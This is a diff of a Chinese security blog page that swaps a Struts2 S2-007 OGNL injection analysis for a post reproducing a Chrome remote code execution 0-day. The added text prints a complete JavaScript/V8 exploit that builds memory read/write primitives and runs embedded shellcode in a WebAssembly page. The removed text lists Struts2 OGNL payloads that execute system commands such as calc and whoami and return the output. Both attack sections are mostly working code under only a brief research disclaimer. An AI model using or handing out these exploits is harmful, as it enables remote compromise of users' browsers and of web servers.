@@ -73,7 +73,7 @@
 
 
 
-  <meta name="keywords" content="Struts2," />
+  <meta name="keywords" content="漏洞复现," />
 
 
 
@@ -84,32 +84,21 @@
 
 
 
-<meta name="description" content="漏洞概要可参考官方安全公告：https:&#x2F;&#x2F;cwiki.apache.org&#x2F;confluence&#x2F;display&#x2F;WW&#x2F;S2-007 漏洞分析S2-007的利用场景比较苛刻，要求对提交的参数配置了验证规则并对提交的参数进行类型转换的时候会造成OGNL表达式的执行。 这个漏洞的成因在于，在Struts2中，关于表单我们可以设置每个字段的规则验证，如果类型转换错误时，就会进行错误的字符串拼接，通过闭">
+<meta name="description" content="本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。  小维  漏洞描述2021年04月13日，发现国外安全研究发布了Chrome 远程代码执行 0Day的POC详情~ 影响版本Google Chrome: &lt;&#x3D;89.0.4389.114 基与chrome内核的其他浏览器">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Struts2-007漏洞分析">
-<meta property="og:url" content="https://scriptkid-beta.github.io/2020/12/28/Struts2-007%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/index.html">
+<meta property="og:title" content="Chrome 远程代码执行漏洞">
+<meta property="og:url" content="https://scriptkid-beta.github.io/2021/04/13/chrome%200day/index.html">
 <meta property="og:site_name" content="小维的博客">
-<meta property="og:description" content="漏洞概要可参考官方安全公告：https:&#x2F;&#x2F;cwiki.apache.org&#x2F;confluence&#x2F;display&#x2F;WW&#x2F;S2-007 漏洞分析S2-007的利用场景比较苛刻，要求对提交的参数配置了验证规则并对提交的参数进行类型转换的时候会造成OGNL表达式的执行。 这个漏洞的成因在于，在Struts2中，关于表单我们可以设置每个字段的规则验证，如果类型转换错误时，就会进行错误的字符串拼接，通过闭">
-<meta property="og:image" content="https://scriptkid-beta.github.io/img/Struts2-007%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201228145655095.png">
-<meta property="og:image" content="https://scriptkid-beta.github.io/img/Struts2-007%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201225155539404.png">
-<meta property="og:image" content="https://scriptkid-beta.github.io/img/Struts2-007%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201225155827873.png">
-<meta property="og:image" content="https://scriptkid-beta.github.io/img/Struts2-007%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201225160842454.png">
-<meta property="og:image" content="https://scriptkid-beta.github.io/img/Struts2-007%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201225160414486.png">
-<meta property="og:image" content="https://scriptkid-beta.github.io/img/Struts2-007%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201225161637883.png">
-<meta property="og:image" content="https://scriptkid-beta.github.io/img/Struts2-007%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201225161954632.png">
-<meta property="og:image" content="https://scriptkid-beta.github.io/img/Struts2-007%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201225162709287.png">
-<meta property="og:image" content="https://scriptkid-beta.github.io/img/Struts2-007%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201225164705641.png">
-<meta property="og:image" content="https://scriptkid-beta.github.io/img/Struts2-007%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201225172127453.png">
-<meta property="og:image" content="https://scriptkid-beta.github.io/img/Struts2-007%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201225172048324.png">
-<meta property="og:image" content="https://scriptkid-beta.github.io/img/Struts2-007%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201225172537185.png">
-<meta property="og:image" content="https://scriptkid-beta.github.io/img/Struts2-007%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201225172935494.png">
-<meta property="og:image" content="https://scriptkid-beta.github.io/img/Struts2-007%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201225173722361.png">
-<meta property="article:published_time" content="2020-12-28T10:51:49.112Z">
-<meta property="article:modified_time" content="2020-12-28T10:57:03.092Z">
+<meta property="og:description" content="本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。  小维  漏洞描述2021年04月13日，发现国外安全研究发布了Chrome 远程代码执行 0Day的POC详情~ 影响版本Google Chrome: &lt;&#x3D;89.0.4389.114 基与chrome内核的其他浏览器">
+<meta property="og:image" content="https://scriptkid-beta.github.io/img/chrome%200day/image-20210413161555848.png">
+<meta property="og:image" content="https://scriptkid-beta.github.io/img/chrome%200day/image-20210413160904379.png">
+<meta property="og:image" content="https://scriptkid-beta.github.io/img/chrome%200day/image-20210413160943095.png">
+<meta property="article:published_time" content="2021-04-13T10:18:58.000Z">
+<meta property="article:modified_time" content="2021-06-26T09:26:52.727Z">
 <meta property="article:author" content="小维同学">
-<meta property="article:tag" content="Struts2">
+<meta property="article:tag" content="漏洞复现">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https://scriptkid-beta.github.io/img/Struts2-007%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201228145655095.png">
+<meta name="twitter:image" content="https://scriptkid-beta.github.io/img/chrome%200day/image-20210413161555848.png">
 
 
 
@@ -139,13 +128,13 @@
 
 
 
-  <link rel="canonical" href="https://scriptkid-beta.github.io/2020/12/28/Struts2-007漏洞分析/"/>
+  <link rel="canonical" href="https://scriptkid-beta.github.io/2021/04/13/chrome 0day/"/>
 
 
 
 
 
-  <title>Struts2-007漏洞分析 | 小维的博客</title>
+  <title>Chrome 远程代码执行漏洞 | 小维的博客</title>
   
 
 
@@ -316,7 +305,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://scriptkid-beta.github.io/2020/12/28/Struts2-007%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
+    <link itemprop="mainEntityOfPage" href="https://scriptkid-beta.github.io/2021/04/13/chrome%200day/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="小维同学">
@@ -333,7 +322,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">Struts2-007漏洞分析</h1>
+          <h1 class="post-title" itemprop="name headline">Chrome 远程代码执行漏洞</h1>
         
 
         <div class="post-meta">
@@ -345,8 +334,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-12-28T18:51:49+08:00">
-                2020-12-28
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-04-13T18:18:58+08:00">
+                2021-04-13
               </time>
             
 
@@ -377,7 +366,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  787字
+                  881字
                 </span>
               
 
@@ -393,7 +382,7 @@
                   <span class="post-meta-item-text">阅读时长 &asymp;</span>
                 
                 <span title="阅读时长">
-                  3分钟
+                  5分钟
                 </span>
               
             </div>
@@ -414,42 +403,30 @@
       
 
       
-        <h4 id="漏洞概要"><a href="#漏洞概要" class="headerlink" title="漏洞概要"></a>漏洞概要</h4><p>可参考官方安全公告：<a href="https://cwiki.apache.org/confluence/display/WW/S2-007" target="_blank" rel="noopener">https://cwiki.apache.org/confluence/display/WW/S2-007</a></p>
-<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>S2-007的利用场景比较苛刻，要求对提交的参数配置了验证规则并对提交的参数进行类型转换的时候会造成<code>OGNL</code>表达式的执行。</p>
-<p>这个漏洞的成因在于，在Struts2中，关于表单我们可以设置每个字段的规则验证，如果类型转换错误时，就会进行错误的字符串拼接，通过闭合引号导致<code>OGNL</code>的语法解析。</p>
+        <p>本文仅限技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。</p>
+<div style="text-align: right"> 小维</div>
+
+<h4 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>2021年04月13日，发现国外安全研究发布了Chrome 远程代码执行 0Day的POC详情~</p>
+<h4 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h4><p>Google Chrome: &lt;=89.0.4389.114</p>
+<p>基与chrome内核的其他浏览器</p>
 <a id="more"></a>
 
-<p>简易POC</p>
-<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">'+(#application)+'</span><br></pre></td></tr></table></figure>
+<h4 id="环境介绍"><a href="#环境介绍" class="headerlink" title="环境介绍"></a>环境介绍</h4><p>Google Chrome: 89.0.4389.114</p>
+<p><img src="/img/chrome%200day/image-20210413161555848.png" alt="image-20210413161555848"></p>
+<h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><p>exploit js文件</p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">BSD 2-Clause License</span></span><br><span class="line"><span class="comment">Copyright (c) 2021, rajvardhan agarwal</span></span><br><span class="line"><span class="comment">All rights reserved.</span></span><br><span class="line"><span class="comment">Redistribution and use in source and binary forms, with or without</span></span><br><span class="line"><span class="comment">modification, are permitted provided that the following conditions are met:</span></span><br><span class="line"><span class="comment">1. Redistributions of source code must retain the above copyright notice, this</span></span><br><span class="line"><span class="comment">   list of conditions and the following disclaimer.</span></span><br><span class="line"><span class="comment">2. Redistributions in binary form must reproduce the above copyright notice,</span></span><br><span class="line"><span class="comment">   this list of conditions and the following disclaimer in the documentation</span></span><br><span class="line"><span class="comment">   and/or other materials provided with the distribution.</span></span><br><span class="line"><span class="comment">THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"</span></span><br><span class="line"><span class="comment">AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE</span></span><br><span class="line"><span class="comment">IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE</span></span><br><span class="line"><span class="comment">DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE</span></span><br><span class="line"><span class="comment">FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL</span></span><br><span class="line"><span class="comment">DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR</span></span><br><span class="line"><span class="comment">SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER</span></span><br><span class="line"><span class="comment">CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,</span></span><br><span class="line"><span class="comment">OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE</span></span><br><span class="line"><span class="comment">OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">var wasm_code = new Uint8Array([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>])</span><br><span class="line">var wasm_mod = new WebAssembly.Module(wasm_code);</span><br><span class="line">var wasm_instance = new WebAssembly.Instance(wasm_mod);</span><br><span class="line">var f = wasm_instance.exports.main;</span><br><span class="line"></span><br><span class="line">var buf = new ArrayBuffer(<span class="number">8</span>);</span><br><span class="line">var f64_buf = new Float64Array(buf);</span><br><span class="line">var u64_buf = new Uint32Array(buf);</span><br><span class="line">let buf2 = new ArrayBuffer(<span class="number">0x150</span>);</span><br><span class="line"></span><br><span class="line">function ftoi(val) &#123;</span><br><span class="line">    f64_buf[<span class="number">0</span>] = val;</span><br><span class="line">    return BigInt(u64_buf[<span class="number">0</span>]) + (BigInt(u64_buf[<span class="number">1</span>]) &lt;&lt; <span class="number">32</span>n);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function itof(val) &#123;</span><br><span class="line">    u64_buf[<span class="number">0</span>] = Number(val &amp; <span class="number">0xffffffff</span>n);</span><br><span class="line">    u64_buf[<span class="number">1</span>] = Number(val &gt;&gt; <span class="number">32</span>n);</span><br><span class="line">    return f64_buf[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">const _arr = new Uint32Array([<span class="number">2</span>**<span class="number">31</span>]);</span><br><span class="line"></span><br><span class="line">function foo(a) &#123;</span><br><span class="line">    var x = <span class="number">1</span>;</span><br><span class="line">	x = (_arr[<span class="number">0</span>] ^ <span class="number">0</span>) + <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	x = Math.abs(x);</span><br><span class="line">	x -= <span class="number">2147483647</span>;</span><br><span class="line">	x = Math.max(x, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">	x -= <span class="number">1</span>;</span><br><span class="line">	if(x==<span class="number">-1</span>) x = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	var arr = new Array(x);</span><br><span class="line">	arr.shift();</span><br><span class="line">	var cor = [<span class="number">1.1</span>, <span class="number">1.2</span>, <span class="number">1.3</span>];</span><br><span class="line"></span><br><span class="line">	return [arr, cor];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for(var i=<span class="number">0</span>;i&lt;<span class="number">0x3000</span>;++i)</span><br><span class="line">    foo(true);</span><br><span class="line"></span><br><span class="line">var x = foo(false);</span><br><span class="line">var arr = x[<span class="number">0</span>];</span><br><span class="line">var cor = x[<span class="number">1</span>];</span><br><span class="line"></span><br><span class="line">const idx = <span class="number">6</span>;</span><br><span class="line">arr[idx+<span class="number">10</span>] = <span class="number">0x4242</span>;</span><br><span class="line"></span><br><span class="line">function addrof(k) &#123;</span><br><span class="line">    arr[idx+<span class="number">1</span>] = k;</span><br><span class="line">    return ftoi(cor[<span class="number">0</span>]) &amp; <span class="number">0xffffffff</span>n;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function fakeobj(k) &#123;</span><br><span class="line">    cor[<span class="number">0</span>] = itof(k);</span><br><span class="line">    return arr[idx+<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var float_array_map = ftoi(cor[<span class="number">3</span>]);</span><br><span class="line"></span><br><span class="line">var arr2 = [itof(float_array_map), <span class="number">1.2</span>, <span class="number">2.3</span>, <span class="number">3.4</span>];</span><br><span class="line">var fake = fakeobj(addrof(arr2) + <span class="number">0x20</span>n);</span><br><span class="line"></span><br><span class="line">function arbread(addr) &#123;</span><br><span class="line">    if (addr % <span class="number">2</span>n == <span class="number">0</span>) &#123;</span><br><span class="line">        addr += <span class="number">1</span>n;</span><br><span class="line">    &#125;</span><br><span class="line">    arr2[<span class="number">1</span>] = itof((<span class="number">2</span>n &lt;&lt; <span class="number">32</span>n) + addr - <span class="number">8</span>n);</span><br><span class="line">    return (fake[<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function arbwrite(addr, val) &#123;</span><br><span class="line">    if (addr % <span class="number">2</span>n == <span class="number">0</span>) &#123;</span><br><span class="line">        addr += <span class="number">1</span>n;</span><br><span class="line">    &#125;</span><br><span class="line">    arr2[<span class="number">1</span>] = itof((<span class="number">2</span>n &lt;&lt; <span class="number">32</span>n) + addr - <span class="number">8</span>n);</span><br><span class="line">    fake[<span class="number">0</span>] = itof(BigInt(val));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function copy_shellcode(addr, shellcode) &#123;</span><br><span class="line">    let dataview = new DataView(buf2);</span><br><span class="line">    let buf_addr = addrof(buf2);</span><br><span class="line">    let backing_store_addr = buf_addr + <span class="number">0x14</span>n;</span><br><span class="line">    arbwrite(backing_store_addr, addr);</span><br><span class="line"></span><br><span class="line">    for (let i = <span class="number">0</span>; i &lt; shellcode.length; i++) &#123;</span><br><span class="line">        dataview.setUint32(<span class="number">4</span>*i, shellcode[i], true);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var rwx_page_addr = ftoi(arbread(addrof(wasm_instance) + <span class="number">0x68</span>n));</span><br><span class="line">console.log(<span class="string">"[+] Address of rwx page: "</span> + rwx_page_addr.toString(<span class="number">16</span>));</span><br><span class="line">var shellcode = [<span class="number">3833809148</span>,<span class="number">12642544</span>,<span class="number">1363214336</span>,<span class="number">1364348993</span>,<span class="number">3526445142</span>,<span class="number">1384859749</span>,<span class="number">1384859744</span>,<span class="number">1384859672</span>,<span class="number">1921730592</span>,<span class="number">3071232080</span>,<span class="number">827148874</span>,<span class="number">3224455369</span>,<span class="number">2086747308</span>,<span class="number">1092627458</span>,<span class="number">1091422657</span>,<span class="number">3991060737</span>,<span class="number">1213284690</span>,<span class="number">2334151307</span>,<span class="number">21511234</span>,<span class="number">2290125776</span>,<span class="number">1207959552</span>,<span class="number">1735704709</span>,<span class="number">1355809096</span>,<span class="number">1142442123</span>,<span class="number">1226850443</span>,<span class="number">1457770497</span>,<span class="number">1103757128</span>,<span class="number">1216885899</span>,<span class="number">827184641</span>,<span class="number">3224455369</span>,<span class="number">3384885676</span>,<span class="number">3238084877</span>,<span class="number">4051034168</span>,<span class="number">608961356</span>,<span class="number">3510191368</span>,<span class="number">1146673269</span>,<span class="number">1227112587</span>,<span class="number">1097256961</span>,<span class="number">1145572491</span>,<span class="number">1226588299</span>,<span class="number">2336346113</span>,<span class="number">21530628</span>,<span class="number">1096303056</span>,<span class="number">1515806296</span>,<span class="number">1497454657</span>,<span class="number">2202556993</span>,<span class="number">1379999980</span>,<span class="number">1096343807</span>,<span class="number">2336774745</span>,<span class="number">4283951378</span>,<span class="number">1214119935</span>,<span class="number">442</span>,<span class="number">0</span>,<span class="number">2374846464</span>,<span class="number">257</span>,<span class="number">2335291969</span>,<span class="number">3590293359</span>,<span class="number">2729832635</span>,<span class="number">2797224278</span>,<span class="number">4288527765</span>,<span class="number">3296938197</span>,<span class="number">2080783400</span>,<span class="number">3774578698</span>,<span class="number">1203438965</span>,<span class="number">1785688595</span>,<span class="number">2302761216</span>,<span class="number">1674969050</span>,<span class="number">778267745</span>,<span class="number">6649957</span>];</span><br><span class="line">copy_shellcode(rwx_page_addr, shellcode);</span><br><span class="line">f();</span><br></pre></td></tr></table></figure>
 
-<p>在 Struts2 中，可以将 HTTP 请求数据注入到实际业务 Action 的属性中。而这些属性可以是任意类型的数据，通过 HTTP 只能获取到 String 类型数据，所以这里存在类型转换。我们可以通过 xml 文件，来定义转换规则。例如，我这里定义了一个 <code>UserAction</code> 类，其有一个 <code>Integer</code> 类型的 <code>age</code> 属性，这里我们让其数值范围在<code>1-150</code> 。</p>
-<p><img src="/img/Struts2-007%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201228145655095.png" alt="image-20201228145655095"></p>
-<p><img src="/img/Struts2-007%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201225155539404.png" alt="image-20201225155539404"></p>
-<p>如果此时我们将 <code>age</code> 属性值设置成一个字符串，那么就会引发类型转换错误。Struts2 会将用户输入的数据经过处理再次返回给用户。</p>
-<p><img src="/img/Struts2-007%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201225155827873.png" alt="image-20201225155827873"></p>
-<p>而在这个处理的过程中，就存在 <code>OGNL</code> 表达式注入，我们先在<code>ConversionErrorInterceptor:intercept()</code>方法中打上断点(<code>ConversionErrorInterceptor</code> 类是专门用来处理类型转换失败的拦截器)，当类型出现错误的时候，就会进入这里</p>
-<p><img src="/img/Struts2-007%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201225160842454.png" alt="image-20201225160842454"></p>
-<p><img src="/img/Struts2-007%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201225160414486.png" alt="image-20201225160414486"></p>
-<p>当发生类型转换错误时，程序会将用户输入的值存入 <code>fakie</code> 变量。在存入之前，会先将值用 <code>getOverrideExpr</code>方法处理，我们跟进该方法。</p>
-<p><img src="/img/Struts2-007%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201225161637883.png" alt="image-20201225161637883"></p>
-<p>在 <code>getOverrideExpr</code> 方法中，会在用户输入的值两边拼接上单引号，然后再将值存入刚刚的 <code>fakie</code> 变量。这里把我们的payload用单引号阔起来了，这也就解释了为什么我们的payload是形如 <code>&#39; + (*) + &#39;</code>的形式，就是为了逃逸这个单引号。</p>
-<p><img src="/img/Struts2-007%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201225161954632.png" alt="image-20201225161954632"></p>
-<p>接着程序会把<code>fakie</code> 变量通过<code>setExprOverrides</code>将其放入<code>OgnlValueStack.overrides</code>中</p>
-<p><img src="/img/Struts2-007%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201225162709287.png" alt="image-20201225162709287"></p>
-<p><img src="/img/Struts2-007%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201225164705641.png" alt="image-20201225164705641"></p>
-<p>然后在解析到 Struts2的 <code>/&gt;</code>标签时，会将用户输入值经过<code>OGNL</code> 执行并返回。如果先前 <code>OgnlValueStack.overrides</code>存储过相关字段，则会先从<code>OgnlValueStack.overrides</code> 中取出相关值，然后再通过<code>OGNL</code>执行。</p>
-<p><img src="/img/Struts2-007%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201225172127453.png" alt="image-20201225172127453"></p>
-<p><img src="/img/Struts2-007%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201225172048324.png" alt="image-20201225172048324"></p>
-<p><img src="/img/Struts2-007%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/image-20201225172537185.png" alt="image-20201225172537185"></p>
-<figure class="highlight purebasic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 弹计算器</span><br><span class="line">'+(<span class="symbol">#context</span>[<span class="string">"xwork.MethodAccessor.denyMethodExecution"</span>]=false,@java.lang.<span class="keyword">Runtime</span>@getRuntime().exec(<span class="string">"calc"</span>))+'</span><br><span class="line"></span><br><span class="line">'+(<span class="symbol">#_memberAccess</span>[<span class="string">"allowStaticMethodAccess"</span>]=true,<span class="symbol">#context</span>[<span class="string">"xwork.MethodAccessor.denyMethodExecution"</span>]=false,@java.lang.<span class="keyword">Runtime</span>@getRuntime().exec(<span class="string">"calc"</span>))+'</span><br><span class="line"></span><br><span class="line"># 获取绝对路径</span><br><span class="line">'+(<span class="symbol">#context</span>[<span class="string">"xwork.MethodAccessor.denyMethodExecution"</span>]=false,<span class="symbol">#req</span>=@org.apache.struts2.ServletActionContext@getRequest(),<span class="symbol">#response</span>=<span class="symbol">#context</span>.get(<span class="string">"com.opensymphony.xwork2.dispatcher.HttpServletResponse"</span>).getWriter().write(<span class="symbol">#req</span>.getRealPath('/')))+'</span><br><span class="line"></span><br><span class="line">'+(<span class="symbol">#_memberAccess</span>[<span class="string">"allowStaticMethodAccess"</span>]=true,<span class="symbol">#context</span>[<span class="string">"xwork.MethodAccessor.denyMethodExecution"</span>]=false,<span class="symbol">#req</span>=@org.apache.struts2.ServletActionContext@getRequest(),<span class="symbol">#response</span>=<span class="symbol">#context</span>.get(<span class="string">"com.opensymphony.xwork2.dispatcher.HttpServletResponse"</span>).getWriter().write(<span class="symbol">#req</span>.getRealPath('/')))+'</span><br><span class="line"></span><br><span class="line"># 执行系统命令并回显</span><br><span class="line">'+(<span class="symbol">#context</span>[<span class="string">"xwork.MethodAccessor.denyMethodExecution"</span>]=false,<span class="symbol">#response</span>=<span class="symbol">#context</span>.get(<span class="string">"com.opensymphony.xwork2.dispatcher.HttpServletResponse"</span>).getWriter().write(new java.util.Scanner(@java.lang.<span class="keyword">Runtime</span>@getRuntime().exec('whoami').getInputStream()).useDelimiter(<span class="string">"\\Z"</span>).next()))+'</span><br><span class="line"></span><br><span class="line">'+(<span class="symbol">#_memberAccess</span>[<span class="string">"allowStaticMethodAccess"</span>]=true,<span class="symbol">#context</span>[<span class="string">"xwork.MethodAccessor.denyMethodExecution"</span>]=false,<span class="symbol">#response</span>=<span class="symbol">#context</span>.get(<span class="string">"com.opensymphony.xwork2.dispatcher.HttpServletResponse"</span>).getWriter().write(new java.util.Scanner(@java.lang.<span class="keyword">Runtime</span>@getRuntime().exec('whoami').getInputStream()).useDelimiter(<span class="string">"\\Z"</span>).next()))+'</span><br></pre></td></tr></table></figure>
+<p>html文件</p>
